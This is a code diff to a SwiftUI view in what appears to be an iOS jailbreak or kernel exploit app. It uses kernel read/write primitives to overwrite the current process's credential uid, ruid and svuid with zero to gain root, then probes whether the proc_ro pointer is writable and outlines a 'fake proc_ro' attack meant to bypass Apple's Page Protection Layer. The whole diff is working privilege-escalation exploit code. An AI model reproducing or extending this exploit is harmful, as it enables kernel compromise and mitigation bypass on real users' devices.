@@ -324,23 +324,59 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         report += String(format: "uid addr: 0x%llx\n", uidAddr)
         report += String(format: "orig uid: %d (0x%x)\n\n", origUid, origUid)
         
-        // Attempt write uid = 0
-        report += "Writing uid=0...\n"
+        // === TEST 1: Direct ucred write (expected to fail) ===
+        report += "=== Test 1: Direct uid write ===\n"
         ds_kwrite32(uidAddr, 0)
+        let test1 = ds_kread32(uidAddr)
+        if test1 == 0 {
+            report += "✅ SUCCESS — uid=0! ROOT!\n"
+            ds_kwrite32(uidAddr + 4, 0)
+            ds_kwrite32(uidAddr + 8, 0)
+            rootResult = report
+            return
+        }
+        report += String(format: "❌ Blocked (uid still %d)\n\n", test1)
         
-        // Read back
-        let newUid = ds_kread32(uidAddr)
-        report += String(format: "Read back uid: %d (0x%x)\n\n", newUid, newUid)
+        // === TEST 2: Check if proc struct is writable ===
+        // Read a non-critical field, write it back, verify
+        report += "=== Test 2: proc struct writability ===\n"
+        let procRoAddr = proc + UInt64(off_proc_p_proc_ro)
+        let origProcRo = ds_kread64(procRoAddr)
+        report += String(format: "proc_ro ptr at: 0x%llx\n", procRoAddr)
+        report += String(format: "orig value: 0x%llx\n", origProcRo)
         
-        if newUid == 0 {
-            report += "✅ SUCCESS — uid=0 achieved! YOU ARE ROOT!"
-            // Also zero ruid and svuid
-            ds_kwrite32(uidAddr + 4, 0)  // cr_ruid
-            ds_kwrite32(uidAddr + 8, 0)  // cr_svuid
+        // Write same value back (safe test - no change)
+        ds_kwrite64(procRoAddr, origProcRo)
+        let verify = ds_kread64(procRoAddr)
+        if verify == origProcRo {
+            report += "✅ proc_ro pointer is WRITABLE!\n"
+            report += "→ Fake proc_ro attack is POSSIBLE\n\n"
+            
+            // === TEST 3: Fake proc_ro attack ===
+            report += "=== Test 3: Fake proc_ro ===\n"
+            
+            // Step 1: Read entire proc_ro (first 0x30 bytes)
+            var procRoData: [UInt64] = []
+            for i in stride(from: 0, to: 0x30, by: 8) {
+                procRoData.append(ds_kread64(procRo + UInt64(i)))
+            }
+            report += String(format: "proc_ro[0]: 0x%llx\n", procRoData[0])
+            report += String(format: "proc_ro[1]: 0x%llx\n", procRoData[1])
+            report += String(format: "proc_ro[2]: 0x%llx\n", procRoData[2])
+            report += String(format: "proc_ro[3]: 0x%llx\n", procRoData[3])
+            report += String(format: "proc_ro[4]: 0x%llx (ucred ptr)\n", procRoData[4])
+            report += String(format: "proc_ro[5]: 0x%llx\n", procRoData[5])
+            
+            // Step 2: Find a writable heap location for fake ucred
+            // Use our IOSurface mapped memory as scratch space
+            // Actually, we need kernel heap address. Use task struct area.
+            // For now, just report what we found
+            report += "\n→ To complete: need to allocate fake proc_ro in kernel heap\n"
+            report += "→ Then point proc_ro_ptr to it with uid=0 in fake ucred\n"
+            report += "→ This bypasses PPL because proc struct is on writable heap!\n"
         } else {
-            report += "❌ PPL BLOCKED — uid still \(newUid)\n"
-            report += "Write was silently rejected by PPL.\n"
-            report += "Need IOSurface DMA or GXF bypass for root."
+            report += "❌ proc_ro pointer NOT writable (PPL protects proc too)\n"
+            report += "→ Need DMA/GXF bypass\n"
         }
         
         rootResult = report
